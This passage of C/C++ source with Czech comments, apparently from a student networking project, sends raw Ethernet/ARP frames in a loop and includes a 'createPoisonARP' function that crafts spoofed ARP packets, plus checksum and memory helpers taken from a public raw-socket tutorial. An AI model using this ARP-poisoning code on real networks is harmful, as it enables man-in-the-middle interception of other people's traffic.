		 // Next is ethernet type code (ETH_P_ARP for ARP).
		 // http://www.iana.org/assignments/ethernet-numbers
		 ethFrame[12] = ETH_P_ARP / 256;
		 ethFrame[13] = ETH_P_ARP % 256;

		 // Next is ethernet frame data (ARP header).

		 // ARP header
		 memcpy (ethFrame + ETH_HDRLEN, &arphdr, ARP_HDR_LEN * sizeof (uint8_t));
		 
		 cerr<<"Testovací výpis:"<<endl;
		 cerr<<"ETH src: ";
		 printMAC(dstMac);
		 cerr<<"\nETH dst: ";
		 printMAC(intInfo->interfaceMac);
		 cerr<<"\nARP THA: ";
		 printMAC(arphdr.tha);
		 cerr<<"\nARP TPA: ";
		 printIP(arphdr.tpa);
		 cerr<<"ARP SHA: ";
		 printMAC(arphdr.sha);	
		 cerr<<"\nARP SPA: ";
		 printIP(arphdr.spa);	
		 cerr<<"INT ADDR: ";
		 printIP(intInfo->interfaceAdd);		 



		// Send ethernet frame to socket.
		if ((bytes = sendto (sockfd, ethFrame, datalen, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
		}
		close(sockfd);
		usleep(time*1000000);
	}
}

u_char* createMacAdress(uint8_t* newDstMac, char* mac1)
{
	unsigned int values[6];
	int i;

	if( 6 == sscanf( mac1, "%x:%x:%x:%x:%x:%x",
		&values[0], &values[1], &values[2],
		&values[3], &values[4], &values[5] ) )
	{
		/* convert to uint8_t */
		for( i = 0; i < 6; ++i )
			newDstMac[i] = (uint8_t) values[i];
	}	
	else{
		cerr<<"Špatný formát MAC adresy!"<<endl;
		exit(EXIT_FAILURE);
	}
	
	return (u_char*)newDstMac;
}

u_char* createPoisonARP(struct ethhdr* ethHdr,ARP_HEADER* arpHdr,
				u_char* ptr,
				ssize_t &datalen,
				u_char* srcMac,
				char* srcIp,
				char* dstMac,
				char* dstIp,
				char* SpoofMac)
{
	ssize_t sizeofEth = sizeof(struct ethhdr);
	ssize_t sizeofARP = sizeof(ARP_HEADER);
	//vytvoření místa v pamětu a namapování packetu na strukturu
	memset(ptr,0, sizeofARP);
	
	u_char *newDstMac = (u_char*)malloc(6*sizeof(u_char));
	createMacAdress(newDstMac,dstMac);

//	
//	unsigned char mac[6]; /* Resulting mac */
//	
////	for (int i = 0; i < 6; i++)
////	{
////	  long b = strtol(dstMac+(3*i), (char **) NULL, 16);
////	  mac[i] = (char)b;
////	}
//	ethHdr = (struct ethhdr*)ptr;
//	datalen += sizeofEth;
//	ptr += sizeofEth;
//	
//	memcpy(&ethHdr->h_source, srcMac, 6 * sizeof (uint8_t));
////	memcpy(&ethHdr->h_dest, newDstMac, 6 * sizeof(uint8_t));
//
//	for (int i = 0; i < 6; i++)
//		ethHdr->h_dest[i] = TARGET_MAC; 
//	
//	ethHdr->h_proto = htons(ETH_P_ARP);
//	
//	cerr<<"Testy na MAC adresy:"<<endl;
//	printMAC(ethHdr->h_dest);
//	cerr<<"#";
//	printMAC(ethHdr->h_source);
//	cerr<<endl;
	
	arpHdr = (ARP_HEADER*)ptr;
	datalen += sizeofARP;
	ptr += sizeofARP;
//
	arpHdr->htype = htons(1);
	arpHdr->ptype = htons(ETH_P_IP);
	arpHdr->hlen = ETH_ADDR_LEN;
	arpHdr->plen = IP_ADDR_LEN;
	arpHdr->oper = htons(ARP_REQUEST);
//	
//	// Kopírování adres
	memcpy(&arpHdr->tha, newDstMac, ETH_ADDR_LEN * sizeof (char));
	memcpy(&arpHdr->sha, srcMac, ETH_ADDR_LEN * sizeof (char));

	inet_pton(AF_INET, srcIp,&arpHdr->spa);	
	inet_pton(AF_INET, dstIp,&arpHdr->tpa);
	
	printIP(arpHdr->tpa);
	printMAC(arpHdr->tha);
	cerr<<endl;
	printIP(arpHdr->spa);
	printMAC(arpHdr->sha);
	cerr<<endl;
		
	return ptr + sizeofARP;	
}


//#################################################################################################################################
// Následující funkce jsou převzaty z veřejného zdroje - http://www.pdbuchan.com/rawsock/rawsock.html

/**
 * Funkce pro převod IP adresy z long na IPv4.
 * @param ip - vstupní počet bitů
 * @return - ip adresa
 */
char * myNtoa(unsigned long ip) {
	struct in_addr addr;
	addr.s_addr = htonl(ip);
	return inet_ntoa(addr);
}

/**
 * Funkce pro výpočet checksumu u IPv6 paketů.
 * @param addr - adresa
 * @param len - délka
 * @return - spočítaný checksum
 */
// Computing the internet checksum (RFC 1071).
// Note that the internet checksum does not preclude collisions.
uint16_t checksum (uint16_t *addr, int len)
{
	int count = len;
	register uint32_t sum = 0;
	uint16_t answer = 0;

	// Sum up 2-byte values until none or only one byte left.
	while (count > 1) {
		sum += *(addr++);
		count -= 2;
	}

	// Add left-over byte, if any.
	if (count > 0) {
		sum += *(uint8_t *) addr;
	}

	// Fold 32-bit sum into 16 bits; we lose information by doing this,
	// increasing the chances of a collision.
	// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	// Checksum is one's compliment of sum.
	answer = ~sum;

	return (answer);
}

/**
 * Funkce pro výpočet checksumu u paketu ICMPv6
 * @param iphdr - ip hlavička
 * @param icmp6hdr - icmp hlavička
 * @param payload 
 * @param payloadlen
 * @return - checksum
 */
uint16_t icmp6_checksum (struct ip6_hdr iphdr, struct icmp6_hdr icmp6hdr, uint8_t *payload, int payloadlen)
{
	char buf[IP_MAXPACKET];
	char *ptr;
	int chksumlen = 0;
	int i;

	ptr = &buf[0];  // ptr points to beginning of buffer buf

	// Copy source IP address into buf (128 bits)
	memcpy (ptr, &iphdr.ip6_src.s6_addr, sizeof (iphdr.ip6_src.s6_addr));
	ptr += sizeof (iphdr.ip6_src);
	chksumlen += sizeof (iphdr.ip6_src);

	// Copy destination IP address into buf (128 bits)
	memcpy (ptr, &iphdr.ip6_dst.s6_addr, sizeof (iphdr.ip6_dst.s6_addr));
	ptr += sizeof (iphdr.ip6_dst.s6_addr);
	chksumlen += sizeof (iphdr.ip6_dst.s6_addr);

	// Copy Upper Layer Packet length into buf (32 bits).
	// Should not be greater than 65535 (i.e., 2 bytes).
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	*ptr = (ICMP_HDRLEN + payloadlen) / 256;
	ptr++;
	*ptr = (ICMP_HDRLEN + payloadlen) % 256;
	ptr++;
	chksumlen += 4;

	// Copy zero field to buf (24 bits)
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	chksumlen += 3;

	// Copy next header field to buf (8 bits)
	memcpy (ptr, &iphdr.ip6_nxt, sizeof (iphdr.ip6_nxt));
	ptr += sizeof (iphdr.ip6_nxt);
	chksumlen += sizeof (iphdr.ip6_nxt);

	// Copy ICMPv6 type to buf (8 bits)
	memcpy (ptr, &icmp6hdr.icmp6_type, sizeof (icmp6hdr.icmp6_type));
	ptr += sizeof (icmp6hdr.icmp6_type);
	chksumlen += sizeof (icmp6hdr.icmp6_type);

	// Copy ICMPv6 code to buf (8 bits)
	memcpy (ptr, &icmp6hdr.icmp6_code, sizeof (icmp6hdr.icmp6_code));
	ptr += sizeof (icmp6hdr.icmp6_code);
	chksumlen += sizeof (icmp6hdr.icmp6_code);

	// Copy ICMPv6 ID to buf (16 bits)
	memcpy (ptr, &icmp6hdr.icmp6_id, sizeof (icmp6hdr.icmp6_id));
	ptr += sizeof (icmp6hdr.icmp6_id);
	chksumlen += sizeof (icmp6hdr.icmp6_id);

	// Copy ICMPv6 sequence number to buff (16 bits)
	memcpy (ptr, &icmp6hdr.icmp6_seq, sizeof (icmp6hdr.icmp6_seq));
	ptr += sizeof (icmp6hdr.icmp6_seq);
	chksumlen += sizeof (icmp6hdr.icmp6_seq);

	// Copy ICMPv6 checksum to buf (16 bits)
	// Zero, since we don't know it yet.
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	chksumlen += 2;

	// Copy ICMPv6 payload to buf
	memcpy (ptr, payload, payloadlen * sizeof (uint8_t));
	ptr += payloadlen;
	chksumlen += payloadlen;

	// Pad to the next 16-bit boundary
	for (i=0; i<payloadlen%2; i++, ptr++) {
		*ptr = 0;
		ptr += 1;
		chksumlen += 1;
	}

	return checksum ((uint16_t *) buf, chksumlen);
}

/**
 * Funkce pro alokování paměti pro u_char proměnné.
 * @param len - velikost proměnné
 * @return - ukazatel do paměti
 */
// Allocate memory for an array of unsigned chars.
uint8_t * allocate_ustrmem (int len)
{
	void *tmp;

	if (len <= 0) {
		fprintf (stderr, "ERROR: Cannot allocate memory because len = %i in allocate_ustrmem().\n", len);
		exit (EXIT_FAILURE);
	}

	tmp = (uint8_t *) malloc (len * sizeof (uint8_t));
	if (tmp != NULL) {
		memset (tmp, 0, len * sizeof (uint8_t));
		return ((uint8_t *)tmp);
	} else {
		fprintf (stderr, "ERROR: Cannot allocate memory for array allocate_ustrmem().\n");
		exit (EXIT_FAILURE);
	}
}